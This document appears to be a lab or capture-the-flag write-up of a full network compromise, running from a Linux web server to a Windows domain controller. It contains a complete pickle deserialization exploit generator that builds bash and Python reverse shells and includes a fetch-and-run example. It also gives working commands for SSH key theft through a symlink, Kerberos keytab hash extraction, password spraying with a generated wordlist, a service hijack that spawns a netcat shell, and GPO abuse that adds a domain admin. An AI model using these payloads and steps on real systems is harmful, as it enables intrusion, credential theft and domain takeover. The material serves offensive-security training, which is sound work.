## Basic Information

| IP Address      | Hostname | Operating System |
| --------------- | -------- | ---------------- |
| 192.168.100.131 | web-01   | Linux            |
## Network Scanning & Service Discovery

### Nmap Scan

```bash
sudo nmap -sC -sV -vv --min-rate 500 --max-retries 1 192.168.100.131
```

| IP Address      | Ports Open  |
| --------------- | ----------- |
| 192.168.100.131 | TCP: 22, 80 |
### Service Enumeration

### HTTP - (80)

- http://192.168.100.131

![](Pasted%20image%2020260210192401.png)

- http://192.168.100.131/login

![](Pasted%20image%2020260210192431.png)

- Inspecting the source of the login page revealed a hidden directory which could contain a site archive

![](Pasted%20image%2020260210192534.png)

- Downloading the site-archive

```bash
curl http://192.168.100.131/site-archive --output backup.zip
```

- Extracting the archive

```bash
unzip -d site-archive backup.zip
```

![](Pasted%20image%2020260210192945.png)

- While reviewing the source code, I found a critical vulnerability in the `app.py` which could lead to insecure deserialization, The `app.py` is using `pickle.loads()` which is an insecure function, to load the base64 encoded cookie

![](Pasted%20image%2020260210193109.png)

- Exploit Script
```python
#!/usr/bin/env python3
import pickle
import base64
import os
import sys
import argparse
import subprocess


class ReverseShell:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port

    def __reduce__(self):
        cmd = f"bash -c 'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1'"
        return (os.system, (cmd,))


class PythonReverseShell:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port

    def __reduce__(self):
        cmd = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip}",{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' '''
        return (os.system, (cmd,))


class CommandExec:
    def __init__(self, cmd: str):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


class EvalPayload:
    def __init__(self, code: str):
        self.code = code

    def __reduce__(self):
        return (eval, (self.code,))


def generate_payload(payload_obj) -> str:
    serialized = pickle.dumps(payload_obj)
    encoded = base64.b64encode(serialized).decode('utf-8')
    return encoded


def generate_revshell(ip: str, port: int, use_python: bool = False) -> str:
    if use_python:
        payload = PythonReverseShell(ip, port)
    else:
        payload = ReverseShell(ip, port)
    return generate_payload(payload)


def generate_exec(cmd: str) -> str:
    payload = CommandExec(cmd)
    return generate_payload(payload)


def generate_test() -> str:
    cmd = "id > /tmp/pickle_pwned && echo 'Pickle RCE successful!' >> /tmp/pickle_pwned"
    payload = CommandExec(cmd)
    return generate_payload(payload)


def generate_curl_command(target_url: str, cookie_value: str) -> str:
    return f'''curl -s -b "ctos_session={cookie_value}" "{target_url}" '''

def main():
    parser = argparse.ArgumentParser(
        description="Generate pickle deserialization exploits for CTOS Lab",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Payload Types:
  revshell <ip> <port>     - Bash reverse shell
  pyrevshell <ip> <port>   - Python reverse shell (more reliable)
  exec <command>           - Execute arbitrary command
  test                     - Write proof file to /tmp/pickle_pwned
  curl <url> <ip> <port>   - Generate full curl exploit command

Examples:
  python3 pickle_exploit.py revshell 10.10.14.5 4444
  python3 pickle_exploit.py exec "wget http://10.10.14.5/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"
  python3 pickle_exploit.py curl http://web-01.ctos.corp 10.10.14.5 4444

Listener setup:
  nc -lvnp 4444
  # or
  rlwrap nc -lvnp 4444
        """
    )

    parser.add_argument('type', choices=['revshell', 'pyrevshell', 'exec', 'test', 'curl'],
                        help='Payload type')
    parser.add_argument('args', nargs='*', help='Payload arguments')
    parser.add_argument('-q', '--quiet', action='store_true', help='Only output the payload')

    args = parser.parse_args()

    if args.type == 'revshell':
        if len(args.args) != 2:
            print("[!] Usage: pickle_exploit.py revshell <ip> <port>", file=sys.stderr)
            sys.exit(1)
        ip, port = args.args[0], int(args.args[1])
        payload = generate_revshell(ip, port, use_python=False)

    elif args.type == 'pyrevshell':
        if len(args.args) != 2:
            print("[!] Usage: pickle_exploit.py pyrevshell <ip> <port>", file=sys.stderr)
            sys.exit(1)
        ip, port = args.args[0], int(args.args[1])
        payload = generate_revshell(ip, port, use_python=True)

    elif args.type == 'exec':
        if len(args.args) != 1:
            print("[!] Usage: pickle_exploit.py exec '<command>'", file=sys.stderr)
            sys.exit(1)
        payload = generate_exec(args.args[0])

    elif args.type == 'test':
        payload = generate_test()

    elif args.type == 'curl':
        if len(args.args) != 3:
            print("[!] Usage: pickle_exploit.py curl <target_url> <ip> <port>", file=sys.stderr)
            sys.exit(1)
        target_url, ip, port = args.args[0], args.args[1], int(args.args[2])
        payload = generate_revshell(ip, port, use_python=True)
        curl_cmd = generate_curl_command(target_url, payload)

        if args.quiet:
            print(curl_cmd)
        else:
            print(f"[*] Target: {target_url}")
            print(f"[*] Callback: {ip}:{port}")
            print()
            print("[+] Start listener:")
            print(f"    nc -lvnp {port}")
            print()
            print("[+] Execute exploit:")
            print(f"    {curl_cmd}")
            print()
            print("[+] Cookie value only:")
            print(f"    ctos_session={payload}")
        return

    if args.quiet:
        print(payload)
    else:
        print(f"[+] Payload type: {args.type}")
        print(f"[+] Base64 encoded pickle payload:")
        print()
        print(payload)
        print()
        print("[+] Use as cookie:")
        print(f"    Cookie: ctos_session={payload}")
        print()
        print("[+] Or with curl:")
        print(f'    curl -b "ctos_session={payload}" http://TARGET/')


if __name__ == '__main__':
    main()

```

## Exploitation & Initial Access

- Start a listener to catch the incoming reverse shell

```bash
penelope -i eth0 -p 9001
```

![](Pasted%20image%2020260210193842.png)

```bash
python3 pickle-exploit.py pyrevshell 192.168.0.109 9001
```

![](Pasted%20image%2020260210193859.png)

- Triggering the page with the malicious cookie

```bash
curl -b "ctos_session=gASV/wAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjORweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjEwOSIsOTAwMSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzaCIsIi1pIl0pJyCUhZRSlC4=" http://192.168.100.131/
```

![](Pasted%20image%2020260210194051.png)

```bash
export PATH=/bin:/usr/bin/:$PATH
```

## Horizontal Privilege Escalation


```bash
cat /etc/passwd
```

![](Pasted%20image%2020260210200101.png)


- Running [pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1)

![](Pasted%20image%2020260210195925.png)

- While reviewing the output, a bash script `/opt/backup/backup.sh` is being ran as user `john` 

![](Pasted%20image%2020260210195259.png)

- Reading the bash script revealed that it could be vulnerable to symlink attacks in this script, specifically involving the way it handles files in the `/home/phil/backup_staging` directory and the log file creation.

- An attacker creates a symlink: `ln -s /home/john/.ssh/id_rsa backup_config` in `/home/phil/backup_staging`.
    
- When the script runs `cat $CONFIG_FILE >> "$LOG_FILE"`, it doesn't create a new file; it follows the link to the ssh private key.
    
- **Result:** John's ssh key is now readable at `/var/log/backup/backup.log`.

### Access as john

#### Exploitation

```bash
cd /home/phil/backup_staging
ln -sf /home/john/.ssh/id_rsa backup_config
```

![](Pasted%20image%2020260210201409.png)

- After waiting 2 mins

![](Pasted%20image%2020260210201448.png)


```bash
chmod 400 id_rsa

ssh -i id_rsa john@localhost
```

![](Pasted%20image%2020260210201623.png)

## Vertical Privilege Escalation

```bash
id
```

![](Pasted%20image%2020260210201650.png)

- Viewing the groups of john revealed an interesting group `disk`
- The members of `disk` group can read any files in the system without root

- Viewing mount points

![](Pasted%20image%2020260210201819.png)

```bash
debugfs -R "cat /root/.ssh/id_rsa" /dev/sda2
```


![](Pasted%20image%2020260210201908.png)

```bash
chmod 400 id_rsa
ssh -i id_rsa root@localhost
```


![](Pasted%20image%2020260210202015.png)

## Post Exploitation

- Since this machine is connected to Active Directory, there can be files like `/etc/krb5.keytab`
- A `krb5.keytab` (Kerberos key table) file is used to **store long-term encryption keys for Kerberos principals (users or services), allowing them to authenticate to network services automatically without human intervention or the need to type passwords**.

![](Pasted%20image%2020260210202452.png)

> Extracting Kerberos key table file

- [keytab-extractor](https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py)

```bash
python3 keytabextract.py /etc/krb5.keytab
```

![](Pasted%20image%2020260210202656.png)

```
# NTLM HASH

svc_web:4014777d5f38cb74d24f096972f47969
```

### Pivoting & Tunneling

> Using:- [ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2)

- Setting up proxy on Attacker machine

```bash
sudo ip tuntap add user aibel mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert
```

![](Pasted%20image%2020260210203218.png)

- Downloading the agent to compromised host

![](Pasted%20image%2020260210203341.png)

```bash
./agent -connect 192.168.0.109:11601 -ignore-cert
```

![](Pasted%20image%2020260210203542.png)

- `172.16.11.0/24` is the internal network

![](Pasted%20image%2020260210203846.png)

- Adding the route

```bash
sudo ip route add 172.16.11.0/24 dev ligolo
```

- Starting the tunnel

![](Pasted%20image%2020260210204005.png)

Checking access as `svc_web` on `IT-WS01`

```bash
nxc smb 172.16.11.142 -u svc_web -H 4014777d5f38cb74d24f096972f47969
```

![](Pasted%20image%2020260210204146.png)

```bash
nxc smb 172.16.11.142 -u svc_web -H 4014777d5f38cb74d24f096972f47969 --shares
```

![](Pasted%20image%2020260210204312.png)

- Connect to `IT_Onboarding` share

```bash
smbclient //172.16.11.142/IT_Onboarding -U 'CTOS\svc_web' --pw-nt-hash 4014777d5f38cb74d24f096972f47969
```

![](Pasted%20image%2020260210204500.png)

- Downloading the PDF

```
get SEC-POL-2026-001.pdf
```

![](Pasted%20image%2020260210204617.png)


- According to the PDF, there is a custom password creation rule, we can create custom wordlists for users across the domain


- Adding `DC01.CTOS.corp` & `CTOS.corp` to `/etc/hosts` for dns name resolution


> Getting All AD Users using `ldapdomaindump`

![](Pasted%20image%2020260210212529.png)

```bash
cat domain_users.json | jq -r '.[] | .attributes.cn[0]'
```

![](Pasted%20image%2020260210212855.png)

- Script for generating custom password list

```python
#!/usr/bin/env python3

import argparse
import sys
from typing import List, Generator

SPECIAL_CHARS = ['@', '#', '$', '%', '&']
YEARS = ['2026']

DEFAULT_EMPLOYEES = [
    ("James", "Wilson"),
    ("Lisa", "Conrad"),
    ("Mike", "Chen"),
    ("Sarah", "Patel"),
    ("Elena", "Rodriguez"),
    ("David", "Kim"),
    ("Jennifer", "Moss"),
]


def generate_password(first_name: str, last_name: str, year: str, special: str) -> str:
    first3 = first_name[:3].upper()
    last2 = last_name[-2:].lower()
    return f"{first3}!{year}{special}{last2}"


def generate_passwords_for_user(first_name: str, last_name: str,
                                 years: List[str] = None,
                                 specials: List[str] = None) -> Generator[str, None, None]:
    years = years or YEARS
    specials = specials or SPECIAL_CHARS

    for year in years:
        for special in specials:
            yield generate_password(first_name, last_name, year, special)


def generate_wordlist(employees: List[tuple],
                      years: List[str] = None,
                      specials: List[str] = None,
                      include_usernames: bool = False) -> Generator[str, None, None]:
    for first_name, last_name in employees:
        if include_usernames:
            usernames = [
                f"{first_name[0].lower()}_{last_name.lower()}",
                f"{first_name.lower()}.{last_name.lower()}",
                f"{first_name.lower()}_{last_name.lower()}",
                f"{first_name[0].lower()}{last_name.lower()}",
            ]
            for password in generate_passwords_for_user(first_name, last_name, years, specials):
                for username in usernames:
                    yield f"{username}:{password}"
        else:
            for password in generate_passwords_for_user(first_name, last_name, years, specials):
                yield password


def parse_employee_file(filepath: str) -> List[tuple]:
    employees = []
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split()
                    if len(parts) >= 2:
                        employees.append((parts[0], parts[1]))
    except FileNotFoundError:
        print(f"File not found: {filepath}", file=sys.stderr)
        sys.exit(1)
    return employees


def main():
    parser = argparse.ArgumentParser(
        description="Generate password wordlist based on CTOS password policy",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 password_generator.py -o passwords.txt
  python3 password_generator.py -f "Lisa" -l "Conrad"
  python3 password_generator.py --usernames -o spray_list.txt
  python3 password_generator.py -e employees.txt -o passwords.txt
        """
    )

    parser.add_argument('-f', '--first', help='First name of single target')
    parser.add_argument('-l', '--last', help='Last name of single target')
    parser.add_argument('-e', '--employees', help='File with employee names')
    parser.add_argument('-o', '--output', help='Output file (default: stdout)')
    parser.add_argument('-y', '--years', nargs='+', default=YEARS, help='Years to use')
    parser.add_argument('-s', '--specials', nargs='+', default=SPECIAL_CHARS, help='Special characters')
    parser.add_argument('--usernames', action='store_true', help='Include username:password format')

    args = parser.parse_args()

    if args.first and args.last:
        employees = [(args.first, args.last)]
    elif args.employees:
        employees = parse_employee_file(args.employees)
    else:
        employees = DEFAULT_EMPLOYEES

    total = 0
    output = open(args.output, 'w') if args.output else sys.stdout

    try:
        for entry in generate_wordlist(employees, args.years, args.specials, args.usernames):
            print(entry, file=output)
            total += 1
    finally:
        if args.output:
            output.close()


if __name__ == '__main__':
    main()

```

- Getting usernames of the users in the AD domain

```bash
impacket-GetADUsers CTOS.corp/svc_web -hashes :4014777d5f38cb74d24f096972f47969 -all
```

![](Pasted%20image%2020260210213610.png)

> Password Spraying

```bash
nxc smb 172.16.11.140 -u users.txt -p passwords.txt
```

![](Pasted%20image%2020260210214056.png)

Valid Credentials Found:- `l_conrad:LIS!2026$ad`

## Lateral Movement

```bash
nxc winrm 172.16.11.142 -u l_conrad -p 'LIS!2026$ad'
```

![](Pasted%20image%2020260210214232.png)

# IT-WS01

## Basic Information

| IP Address    | Hostname | Operating System    |
| ------------- | -------- | ------------------- |
| 172.16.11.142 | IT-WS01  | Windows Server 2022 |

## Initial Access


> Login in to `IT-WS01` via WinRM as `l_conrad`

```bash
evil-winrm -i 172.16.11.142 -u l_conrad -p 'LIS!2026$ad'
```

## Privilege Escalation


> Enumerating Windows Services

```powershell
Get-WmiObject -Class win32_service | Select-Object Name, State, PathName
```

![](Pasted%20image%2020260210215008.png)

- This Access denied error is due to how we login via evil-winrm, we should get an interactive shell to fix this.

> Using [Invoke-RunasCs](https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1)

- Uploading the file

![](Pasted%20image%2020260210215330.png)

- Start netcat listener

```bash
rlwrap ncat -lvnp 9002
```


```powershell
. .\Invoke-RunasCs.ps1

Invoke-RunasCs -Domain CTOS.CORP -Username l_conrad -Password 'LIS!2026$ad' -Command cmd.exe -Remote 172.16.11.130:4444
```


- Before that we should add a listener in our `ligolo-ng` proxy, since `IT-WS01` can't reach Kali directly, we should use compromised host to forward the traffic

```
listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:9002
```

![](Pasted%20image%2020260210215843.png)

![](Pasted%20image%2020260210220013.png)

![](Pasted%20image%2020260210220031.png)

- Switch to powershell
```
powershell -ep bypass
```

```powershell
Get-WmiObject -Class win32_service | Select-Object Name, State, PathName
```

![](Pasted%20image%2020260210220346.png)

- Querying Service 

![](Pasted%20image%2020260210220535.png)

- Upload `accesschk64.exe` to get permissions on the service

![](Pasted%20image%2020260210221150.png)

```powershell
.\accesschk64.exe -accepteula -qvc "l_conrad" "CTOSInventorySvc"
```

![](Pasted%20image%2020260210221517.png)

- We have full access to the service, which means we can modify the service and change the binary that it executes

- Upload `nc.exe`

![](Pasted%20image%2020260210221819.png)

```
sc.exe config CTOSInventorySvc binPath= "C:\Users\l_conrad\Documents\nc.exe -e cmd.exe 172.16.11.130 4444"
```

![](Pasted%20image%2020260210222010.png)


```powershell
Start-Service -Name CTOSInventorySvc
```


![](Pasted%20image%2020260210222715.png)

![](Pasted%20image%2020260210223318.png)

> Downloading `kdbx` file

```powershell
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Administrator\Documents\Database.kdbx"))
```

![](Pasted%20image%2020260210223909.png)

```bash
keepass2john Database.kdbx > keepass.hash
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

![](Pasted%20image%2020260210224026.png)

![](Pasted%20image%2020260210224216.png)

Credentials:- `svc_infra_mgr:Infr@Mgmt2026!Secure`

### Analysis with BloodHound


> Collecting data with `rusthound`


```bash
rusthound-ce -d CTOS.corp -c All -u svc_infra_mgr -p 'Infr@Mgmt2026!Secure' -n 172.16.11.140 --zip
```


![](Pasted%20image%2020260210224703.png)

- Start bloodhound

```bash
bloodhound
```

- Upload the collected zip data

![](Pasted%20image%2020260210225107.png)


![](Pasted%20image%2020260210225318.png)

![](Pasted%20image%2020260210225408.png)

SVC_INFRA_MGR@CTOS.CORP Has `GenericWrite` to IT_OPS_LEAD@CTOS.CORP

- Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user

> Exploiting `GenericWrite` for Shadow Credentials

```bash
certipy shadow auto -u 'svc_infra_mgr' -p 'Infr@Mgmt2026!Secure' -account it_ops_lead -target 172.16.11.140 -dc-ip 172.16.11.140 -ldap-scheme ldap
```

![](Pasted%20image%2020260210230007.png)

Credentials:- `it_ops_lead:fd8bd0720fec58d0b5005257dd9f3723`

![](Pasted%20image%2020260210231117.png)

IT_OPS_LEAD@CTOS.CORP Has `AddMember` over `POLICY AUTOMATION GROUP` and `POLICY AUTOMATION GROUP` has `WriteDacl` over `Default Domain Controllers Policy` which means we can add `it_ops_lead` to `Policy Automation Group` and then use [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) to Abuse the `Default Domain Controllers Policy` to add a malicious scheduled task.

```bash
bloodyAD -u it_ops_lead -p '00000000000000000000000000000000:fd8bd0720fec58d0b5005257dd9f3723' -d CTOS.corp \
  --host 172.16.11.140 get search --filter '(displayName=Default Domain Controllers Policy)' \
  --attr cn,displayName,gPCFileSysPat
```

![](Pasted%20image%2020260210230801.png)

```bash
python3 pygpoabuse.py CTOS.corp/it_ops_lead -hashes :fd8bd0720fec58d0b5005257dd9f3723 \
  -gpo-id "6AC1786C-016F-11D2-945F-00C04fB984F9" \
  -dc-ip 172.16.11.140 \
  -command "cmd.exe /c net user aibel P@ssw0rd123! /add /domain && net group \"Domain Admins\" aibel /add /domain"
```

![](Pasted%20image%2020260210231037.png)

```bash
nxc smb 172.16.11.140 -u aibel -p 'P@ssw0rd123!'
```

![](Pasted%20image%2020260210231752.png)

# DC01

## Basic Information

| IP Address    | Hostname | Operating System    |
| ------------- | -------- | ------------------- |
| 172.16.11.140 | DC01     | Windows Server 2022 |

## Access as Domain Admin


```bash
impacket-psexec CTOS.corp/aibel:'P@ssw0rd123!'@172.16.11.140
```

![](Pasted%20image%2020260210231938.png)

![](Pasted%20image%2020260210232009.png)

